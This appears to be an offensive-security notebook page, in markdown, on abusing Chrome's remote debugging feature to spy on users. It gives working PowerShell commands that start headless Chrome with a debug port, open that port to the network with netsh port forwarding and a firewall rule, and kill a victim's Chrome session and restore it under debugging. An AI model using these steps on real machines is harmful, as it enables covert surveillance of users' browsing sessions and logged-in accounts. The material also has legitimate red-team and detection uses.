# Powerful Automation

Automation techniques for offensive security operations.

![COM Objects](COM%2520Objects.md)

## Automating and remote controlling Google Chrome
How to leverage remote debugging to spy on users!
- Running google chrome in the background with remote debugging 
```powershell
## Here we can see also some more good options
Start-Process "chrome" -ArgumentList "https://github.com","--headless","--remote-debugging-port=9222"

## Good option to keep in mind: screenshot=C:/users/zeyad/google.png
## TODO create a script to screen capture browsers
```
- Adding port forward rule (Require admin privileges)
```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222
## Cleanup
netsh interface portproxy reset
```
- Allowing remote connections to port 48333 via firewall
```powershell
New-NetFirewallRule -Name ChromeRemote -DisplayName "Open
Port 48333" -Direction Inbound -Protocol tcp -LocalPort 48333 -Action Allow -Enabled True
## cleanup
Remove-NetFirewallRule -Name ChromeRemote
```
- Alternatively you can enable it directly without port forwarding using the **`--remote-debugging-address=0.0.0.0`** option
```powershell
## This won't work without the --headless option
Start-Process "chrome" -ArgumentList "https://github.com","--remote-debugging-port=9222","--remote-debugging-address=0.0.0.0","--headless"
```
Now you can view the page remotely, but if the url was like :
```txt
https://chrome-devtools-frontend.appspot.com/serve_file/@273bf7ac8c909cde36982d27f66f3c70846a3718/inspector.html?ws=172.16.111.138:9222/devtools/page/2D2CF661C2D2BA88745171418BF50A0E&remoteFrontend=true
```
Consider removing this part to resolve the error.
The final URL should be like:
```txt
http://172.16.111.138:9222/devtools/inspector.html?ws=172.16.111.138:9222/devtools/page/2D2CF661C2D2BA88745171418BF50A0E&remoteFrontend=true
```
> **Important information Notes**
> 1. Chrome is frequently updated, and behaviors might change over time. 
> 2. The remote debugging feature Chrome provides does not offer an encrypted connection, so use this remotely capability carefully.
### Using Chrome remote debugging to spy on users!
- Kill the user chrome session then start a new one
```powershell
## This will require manual portforward
Start-Process "chrome" -ArgumentList "--headless","--remote-debugging-port=9222","--restore-last-session"
```
- View victim settings by browsing to **chrome://settings** (didn't work for me)
